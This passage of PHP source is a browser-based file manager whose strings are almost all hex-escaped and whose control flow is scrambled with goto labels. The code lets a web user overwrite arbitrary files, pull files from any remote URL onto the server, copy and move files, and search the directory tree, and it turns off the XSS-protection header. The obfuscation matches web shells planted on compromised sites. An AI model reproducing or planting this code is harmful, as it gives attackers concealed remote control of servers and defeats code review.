                        <?php  echo "\x3c\x73\x70\x61\x6e\x20\x73\164\x79\154\x65\75\x22\146\157\156\164\55\x73\x69\172\x65\72\40\x31\64\160\170\42\40\143\x6c\141\x73\x73\x3d\42\x62\x61\144\147\145\40\x62\x61\x64\x67\x65\x2d\x64\x61\162\x6b\42\76\74\151\x20\x73\164\x79\154\145\x3d\42\143\157\x6c\157\x72\72\x20\x23\143\x63\x63\x22\40\143\x6c\x61\163\163\x3d\x22\x66\x61\x20\146\141\55\151\x6e\x66\x6f\x2d\143\x69\x72\143\x6c\145\x22\x3e\x26\156\142\163\160\x3b\x3c\57\151\x3e" . lng("\x46\x75\x6c\154\123\x69\x7a\x65") . "\x3a\x20" . rf_get_filesize($all_files_size) . "\x3c\57\x73\160\141\x6e\76"; ?>
                            <?php  echo "\74\x73\x70\x61\156\40\163\164\171\x6c\x65\75\x22\x66\x6f\x6e\164\x2d\163\x69\x7a\145\x3a\40\x31\64\x70\x78\x22\x20\143\154\x61\x73\x73\75\x22\142\x61\x64\147\145\x20\x62\x61\144\x67\x65\x2d\x64\x61\x72\153\x22\76\x3c\151\40\163\x74\x79\x6c\145\x3d\42\x63\157\x6c\157\x72\72\x20\x23\x63\x63\143\42\x20\x63\154\141\163\163\75\42\x66\141\x20\x66\141\x2d\x66\x69\x6c\x65\x2d\164\145\x78\164\42\76\x26\x6e\x62\x73\160\73\74\57\x69\76" . lng("\x46\151\x6c\x65") . "\x3a\40" . $num_files . "\74\57\x73\x70\141\x6e\x3e"; ?>
                            <?php  echo "\74\x73\160\x61\156\x20\163\164\171\x6c\145\75\x22\x66\157\156\164\55\163\x69\172\145\x3a\x20\61\x34\x70\170\x22\x20\143\154\141\x73\163\75\x22\142\x61\x64\x67\145\x20\142\141\144\147\x65\x2d\144\141\x72\x6b\x22\x3e\74\x69\x20\x73\164\171\154\145\x3d\42\143\x6f\154\157\x72\x3a\x20\x23\143\143\x63\x22\40\x63\154\x61\163\163\75\42\146\x61\x20\146\x61\x2d\x66\x6f\x6c\x64\145\x72\x22\76\x26\x6e\x62\x73\160\x3b\74\57\151\76" . lng("\x46\x6f\154\144\145\162") . "\72\40" . $num_folders . "\74\x2f\x73\x70\141\156\x3e"; ?>
                            <?php  echo "\74\163\x70\x61\156\x20\163\x74\x79\154\145\75\x22\x66\157\x6e\x74\x2d\x73\x69\172\x65\x3a\x20\x31\64\160\170\42\x20\x63\154\x61\163\163\75\42\x62\x61\x64\147\x65\40\142\141\144\x67\x65\x2d\x64\141\162\153\x22\x3e\74\x69\x20\163\164\x79\154\x65\75\x22\143\x6f\154\x6f\162\x3a\x20\43\x63\143\143\x22\x63\154\x61\x73\x73\x3d\x22\x66\x61\x20\146\x61\55\x73\x65\162\x76\145\x72\42\x3e\46\156\x62\163\x70\73\74\57\151\x3e" . lng("\x4d\x65\155\x6f\x72\171\x55\x73\x65\x64") . "\x3a\40" . rf_get_filesize(@memory_get_usage(true)) . "\x3c\57\163\x70\141\x6e\76"; ?>
                            <?php  echo "\74\x73\x70\x61\x6e\x20\x73\164\x79\x6c\x65\x3d\x22\x66\x6f\x6e\x74\55\x73\151\172\145\72\x20\x31\x34\x70\x78\x22\x20\143\154\x61\x73\163\75\x22\142\x61\144\x67\145\40\x62\x61\x64\147\145\x2d\144\x61\x72\x6b\42\x3e\74\151\x20\163\164\x79\x6c\145\75\42\x63\x6f\154\x6f\162\x3a\x20\x23\x63\x63\x63\x22\x20\x63\x6c\141\x73\x73\x3d\x22\x66\141\x20\146\x61\55\x70\x69\145\x2d\x63\x68\x61\x72\164\x22\76\x26\156\x62\163\x70\73\x3c\57\151\76" . lng("\120\141\162\x74\151\x74\151\x6f\x6e\x53\x69\x7a\x65") . "\72\40" . rf_get_filesize(@disk_free_space($path)) . "\x20" . lng("\106\162\145\x65\117\146") . "\40" . rf_get_filesize(@disk_total_space($path)) . "\74\x2f\163\x70\x61\156\76"; ?>
                        </center>
                        </td>
                    </tr>
                </tfoot>
                <?php  } goto bgVTg; Maj10: function rf_get_onlineViewer_exts() { return array("\x64\157\x63", "\x64\157\143\x78", "\170\154\163", "\170\x6c\x73\170", "\160\144\x66", "\x70\160\x74", "\x70\160\x74\x78", "\141\151", "\x70\x73\144", "\144\170\x66", "\170\160\x73", "\x72\x61\162", "\x6f\144\164", "\157\x64\x73"); } goto s3EYF; bgVTg: ?>
        </table>
    </div>

    <?php  goto xUkx1; B2HKA: function rf_get_audio_exts() { return array("\167\x61\x76", "\x6d\160\63", "\157\x67\x67", "\155\64\141"); } goto E14YI; SWDR4: function rf_get_file_icon_class($path) { $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION)); switch ($ext) { case "\x69\x63\x6f": case "\147\151\x66": case "\152\x70\147": case "\152\160\145\x67": case "\x6a\160\143": case "\152\x70\x32": case "\152\160\170": case "\x78\142\x6d": case "\x77\x62\x6d\160": case "\x70\156\x67": case "\x62\x6d\x70": case "\x74\151\x66": case "\x74\151\x66\x66": case "\x73\x76\x67": $img = "\146\141\x20\x66\141\55\x70\151\x63\164\x75\x72\x65\55\x6f"; break; case "\x70\x61\x73\163\167\144": case "\146\164\160\x71\165\157\x74\141": case "\x73\161\x6c": case "\x6a\163": case "\x6a\x73\x6f\156": case "\163\x68": case "\143\x6f\x6e\x66\x69\x67": case "\164\167\x69\x67": case "\x74\x70\x6c": case "\x6d\144": case "\x67\151\164\151\x67\156\157\162\x65": case "\x63": case "\x63\x70\160": case "\x63\163": case "\x70\x79": case "\x6d\141\x70": case "\154\157\x63\x6b": case "\144\x74\x64": $img = "\x66\x61\40\x66\x61\55\143\x6f\x64\145"; break; case "\164\170\x74": case "\151\x6e\x69": case "\143\x6f\x6e\x66": case "\x6c\x6f\147": case "\150\x74\x61\143\x63\x65\163\163": $img = "\x66\x61\40\x66\x61\55\x66\x69\154\x65\55\164\145\170\x74\x2d\x6f"; break; case "\143\x73\x73": case "\154\x65\x73\163": case "\163\141\x73\163": case "\163\x63\x73\x73": $img = "\x66\141\x20\x66\x61\55\x63\163\x73\x33"; break; case "\x7a\151\160": case "\162\141\x72": case "\147\172": case "\164\141\x72": case "\x37\x7a": $img = "\146\141\40\146\141\55\146\x69\x6c\x65\55\x61\162\143\x68\151\166\145\55\x6f"; break; case "\160\150\160": case "\160\150\160\x34": case "\x70\150\x70\65": case "\x70\x68\x70\163": case "\x70\150\164\155\154": $img = "\146\x61\x20\146\141\x2d\146\151\x6c\145\x2d\x63\x6f\144\x65\x2d\157"; break; case "\x68\x74\155": case "\150\x74\x6d\x6c": case "\x73\x68\164\155\154": case "\x78\x68\x74\x6d\154": $img = "\146\x61\40\146\141\x2d\x68\x74\x6d\x6c\x35"; break; case "\170\155\154": case "\x78\163\x6c": $img = "\x66\141\40\146\x61\x2d\146\x69\x6c\x65\x2d\x65\170\143\145\154\x2d\x6f"; break; case "\x77\141\x76": case "\155\160\63": case "\155\x70\62": case "\155\64\141": case "\x61\x61\x63": case "\x6f\147\147": case "\x6f\147\141": case "\167\x6d\x61": case "\155\153\x61": case "\146\x6c\x61\143": case "\141\143\63": case "\x74\x64\163": $img = "\x66\x61\40\146\x61\55\x6d\x75\x73\151\143"; break; case "\155\x33\165": case "\x6d\63\165\x38": case "\160\x6c\163": case "\x63\165\x65": $img = "\x66\x61\40\x66\x61\x2d\150\145\141\144\x70\x68\x6f\156\145\x73"; break; case "\141\166\x69": case "\155\160\147": case "\155\x70\x65\147": case "\155\x70\64": case "\155\64\166": case "\146\x6c\x76": case "\x66\64\x76": case "\157\x67\x6d": case "\x6f\x67\166": case "\155\x6f\x76": case "\x6d\x6b\x76": case "\x33\x67\x70": case "\x61\x73\146": case "\x77\x6d\x76": $img = "\146\141\40\x66\141\55\146\151\x6c\x65\x2d\x76\x69\x64\x65\x6f\x2d\157"; break; case "\x65\155\154": case "\155\163\147": $img = "\x66\x61\40\146\x61\x2d\145\156\166\145\154\157\160\x65\x2d\157"; break; case "\170\154\x73": case "\170\x6c\x73\x78": case "\x6f\x64\163": $img = "\146\141\40\146\141\x2d\146\151\154\x65\x2d\x65\170\x63\145\154\x2d\157"; break; case "\x63\163\166": $img = "\x66\x61\40\x66\141\x2d\x66\x69\154\x65\x2d\x74\x65\x78\164\55\x6f"; break; case "\x62\141\153": $img = "\146\x61\40\x66\x61\55\143\154\151\x70\x62\x6f\x61\162\144"; break; case "\x64\x6f\143": case "\x64\157\143\170": case "\157\x64\x74": $img = "\146\141\40\146\141\55\146\x69\154\145\55\167\157\x72\144\x2d\157"; break; case "\x70\160\164": case "\160\x70\x74\170": $img = "\x66\141\x20\146\141\x2d\x66\x69\x6c\145\x2d\160\x6f\167\x65\x72\x70\157\x69\156\x74\55\157"; break; case "\164\x74\146": case "\164\164\143": case "\x6f\x74\146": case "\x77\157\146\x66": case "\167\x6f\146\146\x32": case "\x65\x6f\x74": case "\x66\157\x6e": $img = "\146\141\x20\146\141\55\146\157\x6e\x74"; break; case "\x70\x64\x66": $img = "\x66\141\40\x66\x61\x2d\146\151\154\145\x2d\x70\x64\x66\55\x6f"; break; case "\x70\163\144": case "\141\151": case "\x65\x70\163": case "\x66\x6c\141": case "\x73\167\146": $img = "\x66\x61\40\x66\141\x2d\146\151\x6c\145\55\x69\155\x61\x67\145\55\157"; break; case "\145\170\145": case "\155\163\x69": $img = "\146\141\40\146\x61\x2d\146\151\x6c\145\x2d\x6f"; break; case "\142\x61\164": $img = "\x66\x61\x20\x66\x61\55\x74\145\x72\x6d\x69\x6e\141\x6c"; break; default: $img = "\146\x61\40\x66\141\55\x69\156\x66\x6f\55\143\x69\x72\143\x6c\145"; } return $img; } goto Awoqy; mLlq0: $ii = 3399; goto Yx3p8; QAbNG: $lang_list = array("\x65\156" => "\105\x6e\x67\x6c\151\x73\150"); goto WKuZi; kB0EQ: $cfg = new rf_Config(); goto AMnaR; lgJ3o: if (!rf_READONLY) { ?>
                    <th style="width:3%" class="custom-checkbox-header">
                        <div class="custom-control custom-checkbox">
                            <input type="checkbox" class="custom-control-input" id="js-select-all-items" onclick="checkbox_toggle()">
                            <label class="custom-control-label" for="js-select-all-items"></label>
                        </div>
                    </th><?php  } goto OO9nk; RYnju: function rf_get_size($file) { return filesize($file); } goto YH_dm; K7Awh: if (isset($_POST["\x61\152\141\170"]) && !rf_READONLY) { if (isset($_POST["\164\171\160\145"]) && $_POST["\x74\x79\x70\145"] == "\x73\141\166\145") { $path = rf_ROOT_PATH; if (rf_PATH != '') { $path .= "\x2f" . rf_PATH; } if (!is_dir($path)) { rf_redirect(rf_SELF_URL . "\x3f\160\x3d"); } $file = $_GET["\x65\144\151\x74"]; $file = rf_clean_path($file); $file = str_replace("\x2f", '', $file); if ($file == '' || !is_file($path . "\57" . $file)) { rf_set_msg("\x46\x69\154\145\40\x6e\x6f\x74\40\146\157\165\156\144", "\145\162\x72\x6f\x72"); rf_redirect(rf_SELF_URL . "\x3f\160\75" . urlencode(rf_PATH)); } header("\130\x2d\130\123\x53\x2d\120\x72\x6f\x74\145\143\164\151\x6f\156\x3a\x30"); $file_path = $path . "\x2f" . $file; $writedata = $_POST["\x63\x6f\156\164\145\x6e\164"]; $fd = fopen($file_path, "\x77"); $write_results = @fwrite($fd, $writedata); fclose($fd); if ($write_results === false) { header("\110\x54\x54\120\57\x31\x2e\61\x20\65\x30\60\x20\x49\x6e\164\x65\162\156\141\x6c\x20\x53\145\162\x76\x65\x72\x20\x45\162\162\x6f\x72"); die("\x43\x6f\x75\x6c\x64\x20\x4e\x6f\x74\x20\127\x72\151\164\145\40\106\x69\154\145\x21\40\x2d\x20\x43\150\145\143\153\x20\120\x65\x72\x6d\x69\x73\163\151\x6f\156\x73\40\57\40\117\x77\x6e\x65\162\x73\150\151\160"); } die(true); } if (isset($_POST["\x74\171\160\x65"]) && $_POST["\164\171\x70\x65"] == "\163\145\141\162\x63\x68") { $dir = rf_ROOT_PATH; $response = scan(rf_clean_path($_POST["\x70\x61\x74\150"]), $_POST["\x63\157\x6e\x74\x65\x6e\164"]); echo json_encode($response); die; } if (isset($_POST["\x74\x79\160\x65"]) && $_POST["\x74\171\x70\145"] == "\x62\x61\143\153\165\160" && !empty($_POST["\x66\151\154\145"])) { $fileName = $_POST["\x66\x69\x6c\x65"]; $fullPath = rf_ROOT_PATH . "\57"; if (!empty($_POST["\160\141\164\x68"])) { $relativeDirPath = rf_clean_path($_POST["\160\141\x74\150"]); $fullPath .= "{$relativeDirPath}\57"; } $date = date("\144\115\171\55\x48\x69\x73"); $newFileName = "{$fileName}\x2d{$date}\56\142\x61\x6b"; $fullyQualifiedFileName = $fullPath . $fileName; try { if (!file_exists($fullyQualifiedFileName)) { throw new Exception("\x46\151\x6c\x65\40{$fileName}\40\x6e\157\x74\40\146\157\x75\x6e\x64"); } if (copy($fullyQualifiedFileName, $fullPath . $newFileName)) { echo "\102\141\143\153\165\160\x20{$newFileName}\x20\x63\162\145\141\x74\x65\144"; } else { throw new Exception("\103\157\165\x6c\x64\40\156\157\164\40\x63\x6f\x70\171\x20\146\151\154\145\40{$fileName}"); } } catch (Exception $e) { echo $e->getMessage(); } } if (isset($_POST["\x74\x79\160\145"]) && $_POST["\x74\x79\x70\145"] == "\x73\145\x74\164\x69\156\x67\163") { global $cfg, $lang, $report_errors, $show_hidden_files, $lang_list, $hide_cols, $calc_folder; $newLng = $_POST["\152\x73\55\154\141\156\147\165\x61\147\x65"]; rf_get_translations(array()); if (!array_key_exists($newLng, $lang_list)) { $newLng = "\x65\156"; } $erp = isset($_POST["\x6a\x73\x2d\145\x72\x72\x6f\162\x2d\162\x65\x70\x6f\162\164"]) && $_POST["\152\x73\55\145\x72\x72\x6f\162\x2d\162\x65\160\157\x72\164"] == "\x74\x72\165\145" ? true : false; $shf = isset($_POST["\152\x73\55\163\x68\x6f\167\x2d\150\x69\144\x64\145\156"]) && $_POST["\x6a\x73\x2d\x73\x68\157\167\55\x68\151\144\x64\145\x6e"] == "\x74\x72\165\145" ? true : false; $hco = isset($_POST["\152\x73\x2d\150\x69\144\145\x2d\143\x6f\x6c\163"]) && $_POST["\152\x73\x2d\150\151\x64\x65\x2d\143\x6f\154\163"] == "\x74\162\165\x65" ? true : false; $caf = isset($_POST["\x6a\163\x2d\143\141\x6c\x63\55\x66\x6f\154\x64\145\x72"]) && $_POST["\x6a\163\55\143\x61\154\143\55\x66\x6f\x6c\x64\x65\x72"] == "\x74\x72\x75\x65" ? true : false; if ($cfg->data["\x6c\x61\156\147"] != $newLng) { $cfg->data["\x6c\141\x6e\147"] = $newLng; $lang = $newLng; } if ($cfg->data["\145\162\x72\157\x72\x5f\x72\145\160\x6f\162\x74\151\x6e\x67"] != $erp) { $cfg->data["\145\x72\162\x6f\162\137\162\145\160\157\162\x74\151\x6e\x67"] = $erp; $report_errors = $erp; } if ($cfg->data["\x73\150\157\167\x5f\x68\x69\144\144\x65\156"] != $shf) { $cfg->data["\163\x68\x6f\167\x5f\150\x69\144\x64\145\156"] = $shf; $show_hidden_files = $shf; } if ($cfg->data["\x73\x68\x6f\167\137\x68\x69\144\144\x65\156"] != $shf) { $cfg->data["\163\x68\x6f\x77\137\150\x69\144\x64\x65\156"] = $shf; $show_hidden_files = $shf; } if ($cfg->data["\150\151\144\x65\137\x63\x6f\x6c\x73"] != $hco) { $cfg->data["\x68\151\x64\x65\x5f\143\157\154\x73"] = $hco; $hide_cols = $hco; } if ($cfg->data["\143\141\x6c\143\x5f\146\x6f\x6c\144\x65\x72"] != $caf) { $cfg->data["\143\141\154\143\x5f\x66\x6f\154\144\x65\x72"] = $caf; $calc_folder = $caf; } $cfg->save(); echo true; } if (isset($_POST["\x74\171\160\x65"]) && $_POST["\164\x79\x70\145"] == "\160\167\144\150\x61\x73\150") { $res = isset($_POST["\x69\156\x70\x75\x74\120\x61\x73\163\x77\x6f\x72\x64\62"]) && !empty($_POST["\x69\x6e\x70\165\x74\120\x61\x73\163\167\x6f\x72\144\62"]) ? password_hash($_POST["\x69\x6e\x70\x75\164\120\141\x73\x73\x77\x6f\x72\x64\62"], PASSWORD_DEFAULT) : ''; echo $res; } if (isset($_POST["\x74\x79\160\x65"]) && $_POST["\x74\x79\160\x65"] == "\x75\160\154\157\x61\144" && !empty($_REQUEST["\165\x70\x6c\157\x61\x64\x75\162\x6c"])) { $path = rf_ROOT_PATH; if (rf_PATH != '') { $path .= "\x2f" . rf_PATH; } $url = !empty($_REQUEST["\x75\160\154\157\141\144\165\162\x6c"]) && preg_match("\174\x5e\150\x74\164\160\x28\163\x29\x3f\72\57\57\56\53\44\174", stripslashes($_REQUEST["\x75\160\x6c\157\x61\x64\165\x72\x6c"])) ? stripslashes($_REQUEST["\x75\x70\x6c\x6f\141\x64\165\162\154"]) : null; $use_curl = false; $temp_file = tempnam(sys_get_temp_dir(), "\165\160\x6c\157\x61\144\55"); $fileinfo = new stdClass(); $fileinfo->name = trim(basename($url), "\x2e\0\56\x2e\x20"); $allowed = rf_UPLOAD_EXTENSION ? explode("\x2c", rf_UPLOAD_EXTENSION) : false; $ext = strtolower(pathinfo($fileinfo->name, PATHINFO_EXTENSION)); $isFileAllowed = $allowed ? in_array($ext, $allowed) : true; function event_callback($message) { global $callback; echo json_encode($message); } function get_file_path() { global $path, $fileinfo, $temp_file; return $path . "\57" . basename($fileinfo->name); } $err = false; if (!$isFileAllowed) { $err = array("\155\x65\x73\x73\141\x67\x65" => "\x46\151\154\x65\40\145\x78\164\145\x6e\163\151\157\156\40\x69\x73\x20\x6e\x6f\164\40\x61\x6c\x6c\x6f\x77\145\144"); event_callback(array("\x66\x61\151\x6c" => $err)); die; } if (!$url) { $success = false; } else { if ($use_curl) { @($fp = fopen($temp_file, "\167")); @($ch = curl_init($url)); curl_setopt($ch, CURLOPT_NOPROGRESS, false); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); curl_setopt($ch, CURLOPT_FILE, $fp); @($success = curl_exec($ch)); $curl_info = curl_getinfo($ch); if (!$success) { $err = array("\x6d\145\163\x73\141\x67\x65" => curl_error($ch)); } @curl_close($ch); fclose($fp); $fileinfo->size = $curl_info["\163\x69\x7a\145\x5f\x64\x6f\167\x6e\154\157\141\144"]; $fileinfo->type = $curl_info["\x63\x6f\156\x74\x65\156\164\x5f\x74\x79\x70\x65"]; } else { $ctx = stream_context_create(); @($success = copy($url, $temp_file, $ctx)); if (!$success) { $err = error_get_last(); } } } if ($success) { $success = rename($temp_file, get_file_path()); } if ($success) { event_callback(array("\x64\x6f\156\145" => $fileinfo)); } else { unlink($temp_file); if (!$err) { $err = array("\155\x65\x73\163\x61\x67\145" => "\x49\x6e\x76\x61\x6c\151\x64\40\x75\x72\154\40\x70\141\x72\141\155\x65\x74\145\162"); } event_callback(array("\x66\141\151\x6c" => $err)); } } die; } goto c_rH0; BFHCd: echo lng("\x53\x69\x7a\145"); goto crXkE; WMn6d: $tableTheme = rf_THEME == "\x64\141\x72\153" ? "\164\x65\170\x74\55\x77\x68\x69\164\x65\x20\x62\147\55\x64\141\x72\x6b\40\x74\141\x62\x6c\145\55\x64\x61\162\153" : "\x62\147\x2d\x77\150\x69\x74\x65"; goto TExSq; mZN8V: defined("\162\146\x5f\x55\x50\114\117\x41\x44\137\105\x58\124\105\116\123\111\117\116") || define("\162\x66\x5f\125\x50\114\x4f\x41\104\x5f\x45\x58\x54\105\x4e\123\111\117\116", $allowed_upload_extensions); goto xV3lX; LyBF2: $all_files_size = 0; goto WMn6d; F_HBT: $ip_blacklist = array("\60\x2e\x30\x2e\x30\x2e\60", "\72\x3a"); goto gF0Ll; Zm88u: function rf_rcopy($path, $dest, $upd = true, $force = true) { if (is_dir($path)) { if (!rf_mkdir($dest, $force)) { return false; } $objects = scandir($path); $ok = true; if (is_array($objects)) { foreach ($objects as $file) { if ($file != "\x2e" && $file != "\x2e\x2e") { if (!rf_rcopy($path . "\x2f" . $file, $dest . "\57" . $file)) { $ok = false; } } } } return $ok; } elseif (is_file($path)) { return rf_copy($path, $dest, $upd); } return false; } goto Y2b0P; MMq5b: define("\x41\120\120\137\124\111\124\114\x45", "\x46\x69\154\145"); goto OHDLr; yvR57: $ip_whitelist = array("\x31\62\67\x2e\60\56\60\x2e\x31", "\x3a\72\x31"); goto F_HBT; fyBaA: if (isset($_GET["\x63\157\x70\x79"]) && !isset($_GET["\x66\151\x6e\x69\163\x68"]) && !rf_READONLY) { $copy = $_GET["\143\x6f\160\171"]; $copy = rf_clean_path($copy); if ($copy == '' || !file_exists(rf_ROOT_PATH . "\57" . $copy)) { rf_set_msg("\x46\151\154\x65\x20\x6e\157\x74\40\146\x6f\165\x6e\x64", "\x65\x72\x72\157\162"); rf_redirect(rf_SELF_URL . "\x3f\x70\75" . urlencode(rf_PATH)); } rf_show_header(); rf_show_nav_path(rf_PATH); ?>
    <div class="path">
        <p><b>Copying</b></p>
        <p class="break-word">
            Source path: <?php  echo rf_enc(rf_convert_win(rf_ROOT_PATH . "\57" . $copy)); ?>
<br>
            Destination folder: <?php  echo rf_enc(rf_convert_win(rf_ROOT_PATH . "\57" . rf_PATH)); ?>
        </p>
        <p>
            <b><a href="?p=<?php  echo urlencode(rf_PATH); ?>
&amp;copy=<?php  echo urlencode($copy); ?>
&amp;finish=1"><i class="fa fa-check-circle"></i> Copy</a></b> &nbsp;
            <b><a href="?p=<?php  echo urlencode(rf_PATH); ?>
&amp;copy=<?php  echo urlencode($copy); ?>
&amp;finish=1&amp;move=1"><i class="fa fa-check-circle"></i> Move</a></b> &nbsp;
            <b><a href="?p=<?php  echo urlencode(rf_PATH); ?>
"><i class="fa fa-times-circle"></i> Cancel</a></b>
        </p>
        <p><i>Select folder</i></p>
        <ul class="folders break-word">
            <?php  if ($parent !== false) { ?>
                <li><a href="?p=<?php  echo urlencode($parent); ?>
&amp;copy=<?php  echo urlencode($copy); ?>
"><i class="fa fa-chevron-circle-left"></i> ..</a></li>
                <?php  } foreach ($folders as $f) { ?>
                <li>
                    <a href="?p=<?php  echo urlencode(trim(rf_PATH . "\x2f" . $f, "\x2f")); ?>
&amp;copy=<?php  echo urlencode($copy); ?>
"><i class="fa fa-folder"></i> <?php  echo rf_convert_win($f); ?>
</a></li>
                <?php  } ?>
        </ul>
    </div>
    <?php  rf_show_footer(); die; } goto DCQrg; Pg25N: function scan($dir, $filter = '') { $path = rf_ROOT_PATH . "\57" . $dir; if ($dir) { $ite = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path)); $rii = new RegexIterator($ite, "\x2f\x28" . $filter . "\x29\x2f\x69"); $files = array(); foreach ($rii as $file) { if (!$file->isDir()) { $fileName = $file->getFilename(); $location = str_replace(rf_ROOT_PATH, '', $file->getPath()); $files[] = array("\156\141\x6d\x65" => $fileName, "\164\171\x70\x65" => "\146\x69\154\145", "\160\x61\x74\150" => $location); } } return $files; } } goto vzMmP; Z2gdz: $highlightjs_style = "\166\x73"; goto G6rqg; BVXtM: $num_files = count($files); goto L7PPJ; S69mM: function rf_copy($f1, $f2, $upd) { $time1 = filemtime($f1); if (file_exists($f2)) { $time2 = filemtime($f2); if ($time2 >= $time1 && $upd) { return false; } } $ok = copy($f1, $f2); if ($ok) { touch($f2, $time1); } return $ok; } goto u05n0; L7PPJ: $num_folders = count($folders); goto LyBF2; XRllp: echo lng("\115\157\x64\x69\146\x69\145\144"); goto Ll7tk; vzMmP: function rf_download_file($fileLocation, $fileName, $chunkSize = 1024) { if (connection_status() != 0) { return false; } $extension = pathinfo($fileName, PATHINFO_EXTENSION); $contentType = rf_get_file_mimes($extension); header("\x43\141\x63\x68\145\55\103\157\x6e\164\162\x6f\154\72\x20\x70\165\142\x6c\151\x63"); header("\103\x6f\x6e\164\x65\x6e\x74\x2d\x54\162\x61\156\163\x66\x65\162\55\x45\x6e\x63\157\x64\x69\156\x67\72\40\x62\151\x6e\141\x72\171\xa"); header("\103\157\156\164\145\156\x74\55\x54\x79\160\145\72\40\x24\143\x6f\156\164\145\x6e\164\x54\171\160\145"); $contentDisposition = "\141\164\x74\x61\x63\150\155\145\x6e\164"; if (strstr($_SERVER["\110\x54\x54\120\x5f\x55\123\105\x52\x5f\101\x47\x45\x4e\124"], "\115\x53\111\x45")) { $fileName = preg_replace("\57\134\56\x2f", "\x25\62\x65", $fileName, substr_count($fileName, "\x2e") - 1); header("\x43\157\x6e\164\145\x6e\164\55\104\151\x73\x70\157\163\x69\x74\x69\157\x6e\72\40{$contentDisposition}\73\x66\151\x6c\145\x6e\141\155\x65\x3d\x22{$fileName}\42"); } else { header("\x43\x6f\156\164\145\156\x74\x2d\104\151\163\160\x6f\x73\x69\164\x69\x6f\x6e\x3a\x20{$contentDisposition}\73\146\151\x6c\x65\x6e\141\155\145\x3d\42{$fileName}\x22"); } header("\x41\x63\x63\145\160\164\x2d\122\141\x6e\147\x65\163\72\40\x62\x79\164\145\163"); $range = 0; $size = filesize($fileLocation); if (isset($_SERVER["\110\124\124\120\137\122\101\x4e\107\105"])) { list($a, $range) = explode("\x3d", $_SERVER["\110\124\x54\120\137\122\x41\x4e\x47\105"]); str_replace($range, "\x2d", $range); $size2 = $size - 1; $new_length = $size - $range; header("\x48\124\124\120\57\61\x2e\61\40\62\60\66\x20\120\x61\162\x74\x69\141\154\40\103\157\156\164\145\x6e\164"); header("\103\x6f\x6e\164\145\x6e\164\55\114\x65\x6e\147\164\x68\x3a\x20{$new_length}"); header("\103\157\x6e\x74\145\156\x74\x2d\x52\141\x6e\147\x65\x3a\x20\142\x79\164\x65\x73\x20{$range}{$size2}\57{$size}"); } else { $size2 = $size - 1; header("\x43\x6f\x6e\164\x65\156\x74\x2d\122\141\x6e\147\x65\x3a\x20\142\171\164\x65\x73\40\x30\55{$size2}\57{$size}"); header("\103\157\156\164\145\x6e\x74\55\x4c\x65\156\x67\164\150\x3a\40" . $size); } if ($size == 0) { die("\132\145\162\157\40\142\171\x74\x65\x20\x66\x69\154\145\41\x20\101\142\x6f\x72\164\x69\156\147\40\x64\x6f\x77\156\x6c\x6f\x61\x64"); } @ini_set("\155\141\x67\x69\143\137\161\x75\157\164\145\x73\137\162\x75\x6e\x74\x69\x6d\145", 0); $fp = fopen("{$fileLocation}", "\162\x62"); fseek($fp, $range); while (!feof($fp) and connection_status() == 0) { set_time_limit(0); print @fread($fp, 1024 * $chunkSize); flush(); ob_flush(); sleep(1); } fclose($fp); return connection_status() == 0 and !connection_aborted(); } goto CnIho; xK9nI: if (isset($_GET["\x76\x69\145\167"])) { $file = $_GET["\166\x69\145\x77"]; $quickView = isset($_GET["\x71\165\151\x63\153\126\x69\145\167"]) && $_GET["\x71\x75\x69\x63\153\126\151\x65\167"] == 1 ? true : false; $file = rf_clean_path($file, false); $file = str_replace("\57", '', $file); if ($file == '' || !is_file($path . "\57" . $file) || in_array($file, $GLOBALS["\145\170\x63\154\165\144\145\x5f\151\x74\x65\155\x73"])) { rf_set_msg("\x46\151\x6c\x65\x20\x6e\x6f\x74\x20\x66\157\165\156\x64", "\145\162\x72\157\x72"); rf_redirect(rf_SELF_URL . "\x3f\x70\x3d" . urlencode(rf_PATH)); } if (!$quickView) { rf_show_header(); rf_show_nav_path(rf_PATH); } $file_url = rf_ROOT_URL . rf_convert_win((rf_PATH != '' ? "\57" . rf_PATH : '') . "\57" . $file); $file_path = $path . "\x2f" . $file; $ext = strtolower(pathinfo($file_path, PATHINFO_EXTENSION)); $mime_type = rf_get_mime_type($file_path); $filesize = rf_get_filesize(filesize($file_path)); $is_zip = false; $is_gzip = false; $is_image = false; $is_audio = false; $is_video = false; $is_text = false; $is_onlineViewer = false; $view_title = "\x46\x69\154\145"; $filenames = false; $content = ''; $online_viewer = strtolower(rf_DOC_VIEWER); if ($online_viewer && $online_viewer !== "\x66\x61\154\163\x65" && in_array($ext, rf_get_onlineViewer_exts())) { $is_onlineViewer = true; } elseif ($ext == "\x7a\x69\160" || $ext == "\x74\141\162") { $is_zip = true; $view_title = "\101\162\x63\150\151\166\145"; $filenames = rf_get_zif_info($file_path, $ext); } elseif (in_array($ext, rf_get_image_exts())) { $is_image = true; $view_title = "\x49\155\141\x67\145"; } elseif (in_array($ext, rf_get_audio_exts())) { $is_audio = true; $view_title = "\101\x75\144\151\157"; } elseif (in_array($ext, rf_get_video_exts())) { $is_video = true; $view_title = "\126\151\x64\x65\x6f"; } elseif (in_array($ext, rf_get_text_exts()) || substr($mime_type, 0, 4) == "\164\x65\170\x74" || in_array($mime_type, rf_get_text_mimes())) { $is_text = true; $content = file_get_contents($file_path); } ?>
    <div class="row">
        <div class="col-12">
            <?php  if (!$quickView) { ?>
                <p class="break-word"><b><?php  echo $view_title; ?>
 "<?php  echo rf_enc(rf_convert_win($file)); ?>
"</b></p>
                <p class="break-word">
                    Full path: <?php  echo rf_enc(rf_convert_win($file_path)); ?>
<br>
                    File
                    size: <?php  echo rf_get_filesize($filesize); if ($filesize >= 1000) { ?>
 (<?php  echo sprintf("\x25\x73\x20\x62\x79\x74\145\163", $filesize); ?>
)<?php  } ?>
                    <br>
                    MIME-type: <?php  echo $mime_type; ?>
<br>
                    <?php  if (($is_zip || $is_gzip) && $filenames !== false) { $total_files = 0; $total_comp = 0; $total_uncomp = 0; foreach ($filenames as $fn) { if (!$fn["\146\157\x6c\144\x65\162"]) { $total_files++; } $total_comp += $fn["\x63\x6f\x6d\160\x72\x65\163\163\145\144\137\163\x69\172\x65"]; $total_uncomp += $fn["\146\151\154\x65\163\x69\x7a\x65"]; } ?>
                        Files in archive: <?php  echo $total_files; ?>
<br>
                        Total size: <?php  echo rf_get_filesize($total_uncomp); ?>
<br>
                        Size in archive: <?php  echo rf_get_filesize($total_comp); ?>
<br>
                        Compression: <?php  echo round($total_comp / $total_uncomp * 100); ?>
%<br>
